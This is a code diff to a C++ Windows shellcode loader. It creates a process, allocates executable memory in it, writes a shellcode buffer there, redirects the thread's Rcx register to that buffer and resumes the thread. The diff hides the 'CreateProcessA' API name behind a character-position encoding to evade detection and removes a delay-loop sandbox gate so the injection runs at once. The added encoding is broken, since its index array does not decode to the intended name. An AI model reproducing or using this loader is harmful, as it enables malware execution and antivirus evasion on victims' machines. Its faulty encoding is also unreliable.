@@ -9,6 +9,23 @@
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "user32.lib")
 
+// Character set (lowercase, uppercase, digits)
+char char_set[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+
+// Decode function that maps positions back to characters
+std::string decode_from_positions(const int positions[], size_t size) {
+    std::string decoded_string;
+    for (size_t i = 0; i < size; ++i) {
+        int pos = positions[i];
+        if (pos >= 0 && pos < sizeof(char_set) - 1) { // -1 to exclude null terminator
+            decoded_string.push_back(char_set[pos]);
+        } else {
+            throw std::invalid_argument("Position out of bounds");
+        }
+    }
+    return decoded_string;
+}
+
 // Function that performs the main logic when i == 1
 void main_star() {
     char* ke;
@@ -33,18 +50,24 @@ void main_star() {
     
     HMODULE istfromKernel32 = LoadLibraryA("kernel32.dll");
 
-    BOOL (*itscreatetPro)(
-        LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes,
-        BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo,
-        LPPROCESS_INFORMATION lpProcessInformation
-    ) = (BOOL(*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))
-        GetProcAddress(istfromKernel32, "CreateProcessA");
+    // Decode "CreateProcessA" using the predefined positions
+    int encoded_data[] = {28, 17, 4, 29, 19, 4, 31, 34, 31, 44, 44, 27};
+    size_t data_size = sizeof(encoded_data) / sizeof(encoded_data[0]);
+    std::string decoded_function = decode_from_positions(encoded_data, data_size);
 
-    LPVOID (*pVirtualAllnocEkx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) =
-        (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(istfromKernel32, "VirtualAllocEx");
+    // Use decoded function name
+    BOOL (*itscreatetPro)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, 
+                          LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, 
+                          LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, 
+                          LPPROCESS_INFORMATION lpProcessInformation) = 
+        (BOOL(*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, 
+                 LPSTARTUPINFOA, LPPROCESS_INFORMATION)) GetProcAddress(istfromKernel32, decoded_function.c_str());
 
-    BOOL (*pWriteProcessM)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*) =
-        (BOOL(*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))GetProcAddress(istfromKernel32, "WriteProcessMemory");
+    LPVOID (*pVirtualAllnocEkx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) = 
+        (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD)) GetProcAddress(istfromKernel32, "VirtualAllocEx");
+
+    BOOL (*pWriteProcessM)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*) = 
+        (BOOL(*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*)) GetProcAddress(istfromKernel32, "WriteProcessMemory");
 
     PROCESS_INFORMATION pi = {0};
     li.cb = sizeof(li);
@@ -54,7 +77,7 @@ void main_star() {
 
     CONTEXT ctx = {0};
     ctx.ContextFlags = CONTEXT_FULL;
-    auto pGetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(istfromKernel32, "GetThreadContext");
+    auto pGetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT)) GetProcAddress(istfromKernel32, "GetThreadContext");
     pGetThreadContext(pi.hThread, &ctx);
 
     LPVOID gallio = pVirtualAllnocEkx(pi.hProcess, NULL, code199kLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -65,24 +88,24 @@ void main_star() {
     pWriteProcessM(pi.hProcess, gallio, code199k, code199kLen, NULL);
     ctx.Rcx = (DWORD64)gallio;
 
-    auto pSetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(istfromKernel32, "SetThreadContext");
+    auto pSetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT)) GetProcAddress(istfromKernel32, "SetThreadContext");
     pSetThreadContext(pi.hThread, &ctx);
 
-    auto pResumeThread = (DWORD(WINAPI*)(HANDLE))GetProcAddress(istfromKernel32, "ResumeThread");
+    auto pResumeThread = (DWORD(WINAPI*)(HANDLE)) GetProcAddress(istfromKernel32, "ResumeThread");
     pResumeThread(pi.hThread); 
 }
 
 int main() {
-    unsigned long long i = 0;  // Change this value to control the flow
+    //unsigned long long i = 0;  // Change this value to control the flow
 
-    for(;i < 189642300000; i++) {
-        i +=i % 0xff; 
-    }
-    printf("%llu\n", i);
+    //for(;i < 189642300000; i++) {
+        //i +=i % 0xff; 
+    //}
+    //printf("%llu\n", i);
     
-    if (i == 189642300001){
-    main_star();
-    }
+    //if (i == 189642300001) {
+        main_star();
+    //}
 
     return 0;
 }
